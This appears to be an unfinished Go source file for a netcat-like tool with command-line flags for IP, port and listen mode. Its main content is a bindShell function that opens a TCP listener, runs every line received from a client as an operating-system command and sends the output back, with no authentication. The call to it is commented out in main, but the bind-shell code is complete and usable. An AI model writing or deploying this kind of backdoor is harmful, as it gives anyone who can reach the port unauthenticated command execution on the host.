package main

import (
	"os/exec"
	//"fmt"
	"bufio"
	"bytes"
	"flag"
	"net"
	"strconv"
	"strings"
)

type Flags struct {
	ip     string
	port   int
	listen bool
}

func GetFlags() Flags {

	// define flags
	// ipFlag -> IP Address
	// portFlag -> Port Number
	// listenFlag -> Set to Listen
	ipFlag := flag.String("r", "localhost", "IP Address")
	portFlag := flag.Int("p", 9999, "port number. default is 9999")
	listenFlag := flag.Bool("l", false, "set up listener on specified port")

	// parse flage
	flag.Parse()

	// put flags into Flags struct
	flags := Flags{
		ip:     *ipFlag,
		port:   *portFlag,
		listen: *listenFlag,
	}

	return flags

}

func main() {

	//	if listen == true {
	//		addr := getListenPort(port)
	//		bindShell(addr)
	//	}
}

func getListenPort(port int) string {
	p := strconv.Itoa(port)
	addr := ":" + p
	return addr
}

func bindShell(addr string) {
	ln, _ := net.Listen("tcp", addr)
	defer ln.Close()

	for {
		conn, _ := ln.Accept()
		go func(c net.Conn) {
			for {
				msg, err := bufio.NewReader(conn).ReadString('\n')
				if err != nil {
					break
				}

				command := strings.Trim(msg, "\r\n")

				commandElements := strings.Fields(command)
				cmdName := commandElements[0]
				cmdArgs := commandElements[1:]

				cmd := exec.Command(cmdName, cmdArgs...)
				var b bytes.Buffer
				cmd.Stdout = &b
				cmd.Run()
				conn.Write(b.Bytes())
			}
			c.Close()
		}(conn)
	}
}
